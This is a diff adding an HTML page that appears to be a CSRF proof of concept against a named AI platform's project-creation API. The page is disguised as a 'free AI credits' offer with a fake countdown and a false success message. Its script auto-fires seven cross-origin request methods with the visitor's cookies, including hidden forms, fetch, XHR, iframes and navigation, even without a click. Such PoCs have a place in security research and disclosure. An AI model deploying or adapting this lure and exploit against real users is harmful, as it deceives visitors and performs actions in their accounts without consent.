@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Free AI Credits - Claim Now!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        
+        .description {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .benefits {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .benefit-item:before {
+            content: "✅";
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        
+        .cta-button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 5px 15px rgba(238, 90, 36, 0.3);
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(238, 90, 36, 0.4);
+        }
+        
+        .countdown {
+            background: #e74c3c;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        
+        .hidden-form {
+            display: none;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .exploit-log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎁</div>
+        <h1>🎯 Exclusive AI Credits Available!</h1>
+        <p class="description">
+            Congratulations! You've been selected for our limited-time offer. 
+            Get <strong>1000 FREE AI Credits</strong> to use on AIxBlock platform.
+        </p>
+        
+        <div class="benefits">
+            <div class="benefit-item">Access to advanced AI models</div>
+            <div class="benefit-item">Unlimited project creation</div>
+            <div class="benefit-item">Priority customer support</div>
+            <div class="benefit-item">No credit card required</div>
+        </div>
+        
+        <div class="countdown" id="countdown">
+            ⏰ Limited Time Offer: <span id="timer">02:00</span> remaining
+        </div>
+        
+        <button class="cta-button" onclick="claimCredits()">
+            🚀 Claim My Free Credits Now!
+        </button>
+        
+        <div id="status" class="status" style="display: none;"></div>
+        
+        <!-- Hidden CSRF Form - Method 1: Traditional Form Submission -->
+        <form id="csrf-form" class="hidden-form" action="https://app.aixblock.io/api/projects/" method="POST">
+            <input type="hidden" name="title" value="Free AI Credits Claimed via Cross-Origin CSRF">
+            <input type="hidden" name="description" value="This project was created without user consent through cross-origin CSRF attack. User was tricked into visiting a malicious website that exploited the missing CSRF protection on the project creation endpoint.">
+        </form>
+        
+        <!-- Exploitation Log -->
+        <div class="exploit-log" id="exploit-log">
+            <strong>🚨 CSRF Exploitation Log:</strong><br>
+            <span id="log-content"></span>
+        </div>
+    </div>
+
+    <script>
+        let exploitLog = [];
+        
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            exploitLog.push(`[${timestamp}] ${message}`);
+            document.getElementById('log-content').innerHTML = exploitLog.join('<br>');
+            console.log(`[${timestamp}] ${message}`);
+        }
+        
+        // Initialize logging
+        log('🚨 Cross-Origin CSRF Exploitation Started');
+        log('Target: https://app.aixblock.io/api/projects/');
+        log('Origin: ' + window.location.origin);
+        log('User-Agent: ' + navigator.userAgent);
+        
+        // Countdown timer
+        let timeLeft = 120; // 2 minutes
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                log('⏰ Countdown expired - executing auto-exploitation');
+                executeAllExploits();
+            }
+        }, 1000);
+
+        function claimCredits() {
+            log('🎯 User clicked claim button - executing exploitation');
+            showStatus('🎯 Processing your claim...', 'success');
+            
+            setTimeout(() => {
+                executeAllExploits();
+                showStatus('✅ Credits claimed successfully! Check your AIxBlock account.', 'success');
+            }, 2000);
+        }
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.className = `status ${type}`;
+            statusElement.style.display = 'block';
+        }
+
+        // Method 1: Traditional Form Submission (Bypasses SameSite=Lax)
+        function exploitViaForm() {
+            log('🔓 Attempting CSRF via traditional form submission...');
+            try {
+                document.getElementById('csrf-form').submit();
+                log('✅ Form submission executed successfully');
+                return true;
+            } catch (error) {
+                log('❌ Form submission failed: ' + error.message);
+                return false;
+            }
+        }
+
+        // Method 2: Fetch API with credentials (Bypasses CORS but sends cookies)
+        function exploitViaFetch() {
+            log('🔓 Attempting CSRF via Fetch API with credentials...');
+            
+            return fetch('https://app.aixblock.io/api/projects/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                },
+                body: JSON.stringify({
+                    title: 'CSRF Exploit via Fetch API - Cross-Origin',
+                    description: 'This project was created using the Fetch API without CSRF protection from a different origin'
+                }),
+                credentials: 'include', // This will send cookies if user is logged in
+                mode: 'cors'
+            })
+            .then(response => {
+                log(`📡 Fetch response status: ${response.status}`);
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            })
+            .then(data => {
+                log('✅ CSRF Exploit successful via Fetch API: ' + JSON.stringify(data));
+                showStatus('🔓 CSRF Exploit successful via Fetch API!', 'success');
+                return true;
+            })
+            .catch(error => {
+                log('❌ CSRF Exploit failed via Fetch API: ' + error.message);
+                return false;
+            });
+        }
+
+        // Method 3: XMLHttpRequest with credentials
+        function exploitViaXMLHttpRequest() {
+            log('🔓 Attempting CSRF via XMLHttpRequest with credentials...');
+            
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://app.aixblock.io/api/projects/', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.withCredentials = true; // Send cookies
+                
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        log(`📡 XHR response status: ${xhr.status}`);
+                        if (xhr.status === 200) {
+                            try {
+                                const response = JSON.parse(xhr.responseText);
+                                log('✅ CSRF Exploit successful via XMLHttpRequest: ' + JSON.stringify(response));
+                                showStatus('🔓 CSRF Exploit successful via XMLHttpRequest!', 'success');
+                                resolve(true);
+                            } catch (e) {
+                                log('✅ CSRF Exploit successful via XMLHttpRequest (raw response): ' + xhr.responseText);
+                                resolve(true);
+                            }
+                        } else {
+                            log('❌ CSRF Exploit failed via XMLHttpRequest: HTTP ' + xhr.status);
+                            resolve(false);
+                        }
+                    }
+                };
+                
+                xhr.send(JSON.stringify({
+                    title: 'CSRF Exploit via XMLHttpRequest - Cross-Origin',
+                    description: 'This project was created using XMLHttpRequest without CSRF protection from a different origin'
+                }));
+            });
+        }
+
+        // Method 4: Image-based CSRF (GET request that triggers side effects)
+        function exploitViaImage() {
+            log('🔓 Attempting CSRF via image-based exploitation...');
+            
+            const img = new Image();
+            img.onload = function() {
+                log('✅ Image-based CSRF executed successfully');
+            };
+            img.onerror = function() {
+                log('✅ Image-based CSRF executed (error expected for non-image response)');
+            };
+            
+            // Try to trigger a GET request that might have side effects
+            img.src = 'https://app.aixblock.io/api/projects/?action=create&title=ImageBasedCSRF&description=Exploit';
+        }
+
+        // Method 5: Link-based CSRF (GET request)
+        function exploitViaLink() {
+            log('🔓 Attempting CSRF via link-based exploitation...');
+            
+            const link = document.createElement('a');
+            link.href = 'https://app.aixblock.io/api/projects/?action=create&title=LinkBasedCSRF&description=Exploit';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            log('✅ Link-based CSRF executed');
+        }
+
+        // Method 6: Iframe-based CSRF
+        function exploitViaIframe() {
+            log('🔓 Attempting CSRF via iframe-based exploitation...');
+            
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://app.aixblock.io/api/projects/?action=create&title=IframeBasedCSRF&description=Exploit';
+            iframe.style.display = 'none';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                log('✅ Iframe-based CSRF executed');
+            }, 1000);
+        }
+
+        // Method 7: Script tag-based CSRF
+        function exploitViaScript() {
+            log('🔓 Attempting CSRF via script tag-based exploitation...');
+            
+            const script = document.createElement('script');
+            script.src = 'https://app.aixblock.io/api/projects/?action=create&title=ScriptBasedCSRF&description=Exploit&callback=alert';
+            document.head.appendChild(script);
+            
+            setTimeout(() => {
+                document.head.removeChild(script);
+                log('✅ Script-based CSRF executed');
+            }, 1000);
+        }
+
+        // Execute all exploitation methods
+        function executeAllExploits() {
+            log('🚀 Executing all CSRF exploitation methods...');
+            
+            // Execute methods sequentially to avoid overwhelming the target
+            setTimeout(() => exploitViaForm(), 100);
+            setTimeout(() => exploitViaFetch(), 500);
+            setTimeout(() => exploitViaXMLHttpRequest(), 1000);
+            setTimeout(() => exploitViaImage(), 1500);
+            setTimeout(() => exploitViaLink(), 2000);
+            setTimeout(() => exploitViaIframe(), 2500);
+            setTimeout(() => exploitViaScript(), 3000);
+        }
+
+        // Auto-execute after 5 seconds if user doesn't interact
+        setTimeout(() => {
+            if (exploitLog.length < 5) {
+                log('🤖 Auto-executing exploitation methods...');
+                executeAllExploits();
+            }
+        }, 5000);
+
+        // Additional browser fingerprinting and exploitation info
+        log('🔍 Browser Security Analysis:');
+        log('- SameSite Cookie Policy: ' + (document.cookie.includes('SameSite') ? 'Configured' : 'Default (Lax)'));
+        log('- CORS Support: ' + (typeof fetch !== 'undefined' ? 'Yes' : 'No'));
+        log('- XHR Support: ' + (typeof XMLHttpRequest !== 'undefined' ? 'Yes' : 'No'));
+        log('- Iframe Support: ' + (typeof HTMLIFrameElement !== 'undefined' ? 'Yes' : 'No'));
+        
+        // Test for SameSite bypass techniques
+        function testSameSiteBypass() {
+            log('🔍 Testing SameSite=Lax bypass techniques...');
+            
+            // Test 1: Top-level navigation (allowed by SameSite=Lax)
+            setTimeout(() => {
+                log('🔓 Testing top-level navigation bypass...');
+                window.location.href = 'https://app.aixblock.io/api/projects/?action=create&title=NavigationBypass&description=Testing';
+            }, 4000);
+            
+            // Test 2: Form submission from different origin
+            setTimeout(() => {
+                log('🔓 Testing cross-origin form submission...');
+                const crossOriginForm = document.createElement('form');
+                crossOriginForm.action = 'https://app.aixblock.io/api/projects/';
+                crossOriginForm.method = 'POST';
+                crossOriginForm.target = '_blank';
+                
+                const titleInput = document.createElement('input');
+                titleInput.type = 'hidden';
+                titleInput.name = 'title';
+                titleInput.value = 'Cross-Origin Form Bypass';
+                
+                const descInput = document.createElement('input');
+                descInput.type = 'hidden';
+                descInput.name = 'description';
+                descInput.value = 'Testing cross-origin form submission bypass';
+                
+                crossOriginForm.appendChild(titleInput);
+                crossOriginForm.appendChild(descInput);
+                document.body.appendChild(crossOriginForm);
+                crossOriginForm.submit();
+                document.body.removeChild(crossOriginForm);
+            }, 4500);
+        }
+        
+        // Execute SameSite bypass tests
+        testSameSiteBypass();
+        
+        // Continuous exploitation monitoring
+        setInterval(() => {
+            log('⏰ CSRF Exploitation monitoring active...');
+        }, 15000);
+        
+        // Log final status
+        window.addEventListener('beforeunload', () => {
+            log('🔄 Page unloading - exploitation complete');
+        });
+    </script>
+</body>
+</html>
